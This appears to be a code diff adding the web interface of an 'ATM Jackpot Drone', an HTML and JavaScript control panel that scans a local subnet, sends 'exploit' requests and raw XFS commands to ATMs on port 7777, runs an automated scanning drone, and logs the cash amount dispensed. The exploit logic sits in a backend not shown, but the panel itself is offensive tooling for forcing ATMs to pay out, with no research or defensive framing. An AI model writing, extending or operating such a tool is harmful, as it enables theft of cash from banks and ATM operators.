@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ATM Jackpot Drone</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        h1 { color: #00ff41; border-bottom: 1px solid #00ff41; }
+        .status { background: #111; padding: 15px; border: 1px solid #00ff41; border-radius: 5px; }
+        .btn { background: #00ff41; color: #0a0a0a; border: none; padding: 10px 20px; cursor: pointer; margin: 5px; }
+        .btn-danger { background: #ff0044; color: white; }
+        .btn:hover { opacity: 0.8; }
+        .terminal { background: #111; padding: 10px; border: 1px solid #333; height: 300px; overflow-y: scroll; margin-top: 10px; font-size: 12px; }
+        .input-group { margin: 10px 0; }
+        .input-group input { background: #111; color: #00ff41; border: 1px solid #333; padding: 8px; width: 60%; }
+        .input-group button { background: #00ff41; color: #0a0a0a; border: none; padding: 8px 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🚨 ATM JACKPOT DRONE</h1>
+    <div class="status" id="status">Loading...</div>
+    <br>
+    <button class="btn" onclick="scan()">🔍 Scan Network</button>
+    <button class="btn btn-danger" onclick="exploit()">💣 Exploit Target</button>
+    <button class="btn" onclick="startDrone()">🤖 Start Drone</button>
+    <button class="btn" onclick="stopDrone()">🛑 Stop Drone</button>
+    <button class="btn" onclick="clearLog()">🗑️ Clear Log</button>
+    <br>
+    <div class="input-group">
+        <input type="text" id="cmdInput" placeholder="Target IP">
+        <button onclick="sendCommand()">Send XFS Command</button>
+    </div>
+    <div class="terminal" id="log"></div>
+</div>
+<script>
+    function log(msg) {
+        const el = document.getElementById('log');
+        el.innerHTML += '\n> ' + msg;
+        el.scrollTop = el.scrollHeight;
+    }
+    
+    function updateStatus() {
+        fetch('/api/status')
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('status').innerHTML = `
+                    Scanning: ${data.scanning ? '🟢' : '🔴'}<br>
+                    Targets: ${data.targets || 0}<br>
+                    Results: ${data.results || 0}
+                `;
+            });
+    }
+    
+    function scan() {
+        log('Scanning network...');
+        fetch('/api/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({subnet: '192.168.1.0/24'}) })
+            .then(r => r.json())
+            .then(data => {
+                log('Scan started: ' + JSON.stringify(data));
+                setTimeout(updateStatus, 5000);
+            });
+    }
+    
+    function exploit() {
+        let ip = prompt('Target IP:');
+        if (!ip) return;
+        log('Exploiting ' + ip + '...');
+        fetch('/api/exploit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: ip, port: 7777}) })
+            .then(r => r.json())
+            .then(data => {
+                log('Result: ' + (data.success ? '✅ SUCCESS' : '❌ FAILED'));
+                log('Amount dispensed: ' + (data.amount_dispensed || 0));
+                updateStatus();
+            });
+    }
+    
+    function sendCommand() {
+        let ip = document.getElementById('cmdInput').value;
+        if (!ip) { alert('Enter target IP'); return; }
+        let cmd = prompt('XFS Command:');
+        if (!cmd) return;
+        log('Sending: ' + cmd + ' to ' + ip);
+        fetch('/api/command', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: ip, port: 7777, command: cmd}) })
+            .then(r => r.json())
+            .then(data => {
+                log('Result: ' + data.result.substring(0, 200));
+            });
+    }
+    
+    function startDrone() {
+        log('Starting drone...');
+        fetch('/api/start_drone', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({subnet: '192.168.1.0/24', interval: 30}) })
+            .then(r => r.json())
+            .then(data => {
+                log('Drone: ' + data.status);
+                updateStatus();
+            });
+    }
+    
+    function stopDrone() {
+        log('Stopping drone...');
+        fetch('/api/stop_drone', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                log('Drone: ' + data.status);
+                updateStatus();
+            });
+    }
+    
+    function clearLog() {
+        document.getElementById('log').innerHTML = '';
+    }
+    
+    // Update status every 10 seconds
+    setInterval(updateStatus, 10000);
+    updateStatus();
+    log('🔥 Jackpot Drone Web Interface Ready');
+</script>
+</body>
+</html>
